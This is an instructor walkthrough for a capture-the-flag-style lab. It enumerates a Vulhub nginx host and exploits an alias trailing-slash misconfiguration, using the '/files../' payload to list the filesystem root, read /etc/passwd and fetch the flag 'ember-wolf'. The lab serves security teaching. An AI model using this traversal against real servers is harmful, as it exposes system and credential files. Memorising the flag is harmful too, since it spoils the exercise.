---
id: B02.M12-walkthrough
title: Columbus — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/09-target9-nginx-alias.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Columbus — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Columbus Module (`B02.M12`). Students know only the assigned subnet `192.168.18.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.18.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T9_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `gobuster` (for directory enumeration across the three nginx listeners)
* `curl` (for web enumeration and directory traversal)

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.18.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.18.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```bash
nmap -sn 192.168.18.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.18.10
Host is up (0.000055s latency).
```

**Observation:** One live host responds on this subnet: **192.168.18.10**.

**Inference:** Concentrate service enumeration on that address.

## 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.18.10
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.18.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
* `-sV` — version detection. We need the product string (here, **nginx 1.13.2** on three ports).
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. **8081** and **8082** would be easy to miss on a top-ports-only scan.

*Output excerpt:*
```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    nginx 1.13.2
8081/tcp open  http    nginx 1.13.2
8082/tcp open  http    nginx 1.13.2
```

**Observation:** Three HTTP listeners, all fingerprinted as **nginx 1.13.2**, on ports **8080**, **8081**, and **8082**.

**Inference:** Multiple virtual hosts or demo sites on one box. Nmap does not tell us which port has directory listings or unusual path handling — probe each root and a short list of common path names before committing to an exploit path.

### Initial Web Probing — All Three Ports

nmap found **three** identical-looking HTTP listeners. The next check is the same question three times: “what does `GET /` return?” Doing that by hand is copy-paste with a high chance of skipping a port. A short shell loop is ordinary enumeration automation: one command, three results, same options every time.

```bash
for port in 8080 8081 8082; do
  curl -s -o /dev/null -w "$port / -> HTTP %{http_code}\n" \
    "http://192.168.18.10:$port/"
done
```

*What the loop is doing:*

* `for port in 8080 8081 8082` — bind `port` to each listener nmap listed, then run the body once per value.
* `curl` — one `GET /` per port.
* `-s` — silent; no progress meter mixed into the table.
* `-o /dev/null` — throw away the HTML body. We only need the **status code** to see that the three ports are not the same site.
* `-w "$port / -> HTTP %{http_code}\n"` — `curl` format string: print the loop variable, then the HTTP status (`%{http_code}`), then a newline. That is how three probes become three labeled lines.
* `"http://192.168.18.10:$port/"` — `$port` is expanded by the shell, so the URL changes each iteration.

Same idea as gobuster next: when the work is **repetitive and identical except for one value** (port, host, wordlist entry), a loop or a scanner beats three separate commands.

*Output:*
```text
8080 / -> HTTP 302
8081 / -> HTTP 200
8082 / -> HTTP 200
```

**Observation:** Port 8080 redirects; 8081 and 8082 return normal pages.

**Inference:** Treat all three as candidates until path enumeration shows a distinctive surface. Brute-force common web paths with **gobuster** and Kali’s SecLists wordlist (same approach as Target 5) rather than guessing lab-specific names:

```bash
for port in 8080 8081 8082; do
  echo "=== $port ==="
  gobuster dir -u "http://192.168.18.10:$port" \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -t 40 --no-error
done
```

The gobuster loop is the same automation as the `curl` loop: three ports, one wordlist, do not retype the command. *`gobuster dir`* requests `GET /{word}` for each wordlist line. *`-w`* is SecLists `Discovery/Web-Content/common.txt`. *`-t 40`* is thread count. *`--no-error`* hides transient connection noise.

Sizes and secondary paths (`/static` **301** vs **403**, `index.html` byte length) can differ slightly by gobuster version and how nginx answers `/static`. That does not change the lead. The **discriminator** is **`/files` on 8081**, which the other two ports do not show.

*Output excerpt (8080) — gobuster v3.8 stops; wildcard 302:*
```text
the server returns a status code that matches the provided options for non existing urls. http://192.168.18.10:8080/<random> => 302 (redirect to http://192.168.18.10:8080/<random>) (Length: 161). Please exclude the response length or the status code or set the wildcard option.
```

*Output excerpt (8081):*
```text
files                (Status: 301) [Size: 185] [--> http://192.168.18.10:8081/files/]
index.html           (Status: 200) [Size: 539]
static               (Status: 403) [Size: 169]
```

*Output excerpt (8082):*
```text
index.html           (Status: 200) [Size: 539]
static               (Status: 403) [Size: 169]
test1                (Status: 200) [Size: 155]
test2                (Status: 200) [Size: 155]
```

**Observation:**
- **8080** answers unknown paths with the same **302**, so gobuster cannot tell real paths from noise (wildcard redirect).
- **8081** is the only port with **`/files`** (301 to `/files/`). `/static` here is **403**, not a listing.
- **8082** has `/test1`, `/test2`, and `/static` (403), but **no** `/files`.

**Inference:** Follow **`8081 /files`**. 8080 and 8082 are other nginx demos on this Vulhub image; they are not required for the flag.

**Inference:** The distinctive lead is **`8081 /files`** — a real location unique to that port among these results. Follow `/files/` on **8081** and inspect the body before chasing 8080’s wildcard redirects or 8082’s `/test*` pages.

```bash
curl -s http://192.168.18.10:8081/files/
```

*Output excerpt:*
```html
<html>
<head><title>Index of /files/</title></head>
<body bgcolor="white">
<h1>Index of /files/</h1><hr><pre><a href="../">../</a>
<a href="help.txt">help.txt</a>                                           08-Jul-2026 18:48                  22
</pre><hr></body>
</html>
```

**Observation:** The `<title>` and `<h1>` both say **Index of /files/**, and a real file (`help.txt`) is listed.

**Inference:** That is nginx **autoindex** ([`autoindex` module](https://nginx.org/en/docs/http/ngx_http_autoindex_module.html)) returning a directory listing. A browsable `/files/` location is often mapped to a filesystem directory via `alias` or `root` ([`alias` directive](https://nginx.org/en/docs/http/ngx_http_core_module.html#alias)).

*Search:* `nginx alias trailing slash directory traversal` or `nginx location alias path traversal`

Those queries surface a well-documented misconfiguration: when `location` and `alias` disagree on a trailing slash, requests that append `../` **directly** to the location prefix can escape the intended directory ([Gixy: Nginx Alias Traversal](https://gixy.org/guides/path-traversal); [UK NCSC: nginx alias source-code disclosure](https://www.security.gov.uk/services-resources/cyber-services-government/domain-and-vulnerability-knowledge-base/nginx-alias-source-code-disclosure/)). For a location named `/files`, that pattern is **`/files../`** (not `/files/../`, which nginx normalizes before matching).

**Next probe:** Test whether `/files../` escapes the intended directory on port 8081.

## 3. Vulnerability Discovery

### Automated Path

Not applicable for this target. The issue is a static nginx misconfiguration with a file-read primitive — there is no reliable Metasploit module or remote RCE PoC to run. Exploitation is ordinary `curl` against the mis-mapped location (Manual Path below).

### Manual Path: Alias Prefix Escape

Append `../` directly to the location name (no extra slash between `files` and `..`):

```bash
curl -s http://192.168.18.10:8081/files../
```

*Output excerpt:*
```html
<html>
<head><title>Index of /files../</title></head>
<body bgcolor="white">
<h1>Index of /files../</h1><hr><pre><a href="../">../</a>
<a href="bin/">bin/</a>                                               05-Jul-2017 19:35                   -
<a href="boot/">boot/</a>                                              04-Apr-2017 16:00                   -
<a href="dev/">dev/</a>                                               08-Jul-2026 18:48                   -
<a href="etc/">etc/</a>                                               08-Jul-2026 18:48                   -
<a href="home/">home/</a>                                              08-Jul-2026 18:48                   -
...
```

**Observation:** The listing now shows top-level directories such as `bin/`, `etc/`, and `home/` — the container root (`/`), not just `/files/`. Autoindex is still enabled.

**Inference:** Path alias directory traversal is confirmed (arbitrary directory listing / read).

### Vulnerability Mechanics

Nginx `alias` replaces the matched location prefix with a filesystem path. When `location /files` has **no** trailing slash but `alias /home/` does, a request for `/files../` is prefix-matched as `/files` + `../`, and alias substitution can escape above `/home/`. The Vulhub lab for this target documents the same pattern in `vulnhub/nginx/insecure-configuration/README.md` (“Mistake 2. Directory Traversal Vulnerability”) with payload `http://your-ip:8081/files../`.

### Failed Attempt: Standard Directory Traversal

Traditional `../` segments in the middle of the path are normalized before location matching and do not trigger the alias bug:

```bash
curl -s -I http://192.168.18.10:8081/files/../../../etc/passwd
```

*Output excerpt:*
```text
HTTP/1.1 404 Not Found
Server: nginx/1.13.2
```

*What we learned:* The exploit requires `../` appended **directly** to the location string (`/files../`), not normalized traversal like `/files/../../../etc/passwd`.

## 4. File read (no shell)

This target is a **static nginx** file server. There is no application upload on 8081 and no way to turn directory read into code execution, so there is no reverse shell. There is also no Metasploit module for this alias bug (section 3). Stay on `curl`.

**Primary path:** use the file-read primitive directly for the flag (Step 5). Prove arbitrary file read on a sensitive path first:

```bash
curl -s http://192.168.18.10:8081/files../etc/passwd
```

*Output excerpt:*
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

**Observation:** File contents are returned inline in the response body (not another HTML index page) because `/etc/passwd` is a file, not a directory.

**Inference:** Any readable path under the container root — including `/flag.txt` — can be fetched the same way.

## 5. Retrieve the Flag

Use the same traversal prefix to list `/` and look for `flag.txt`:

```bash
curl -s http://192.168.18.10:8081/files../ | grep flag.txt
```

*Output:*
```html
<a href="flag.txt">flag.txt</a>                                           08-Jul-2026 18:48                  11
```

Retrieve the flag:

```bash
curl -s http://192.168.18.10:8081/files../flag.txt
```

*Output:*
```text
ember-wolf
```

Target 9 is complete.
